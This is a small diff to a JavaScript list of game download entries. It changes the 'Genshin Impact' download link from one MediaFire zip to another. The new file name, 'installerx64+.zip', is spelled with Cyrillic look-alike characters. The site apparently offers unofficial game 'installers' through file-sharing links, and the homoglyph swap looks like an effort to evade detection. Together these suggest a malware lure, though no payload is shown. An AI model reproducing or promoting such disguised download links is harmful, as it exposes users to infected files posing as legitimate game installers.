@@ -116,7 +116,7 @@ export const ItemsList = [
         title: "Genshin Impact",
         downloadCount: "103.4K",
         src: "/icons/genshin-impact.png",
-        downloadLink: "https://download1074.mediafire.com/pmc9ux26qvog/qmosqb1upxzslz4/installerx64+.zip"
+        downloadLink: "https://download1488.mediafire.com/uqyemiwhhzlg/mrsyuze0ynq82wi/%D1%96nstaller%D1%8564+.zip"
       },
       {
         title: "Rainbow Six Siege",
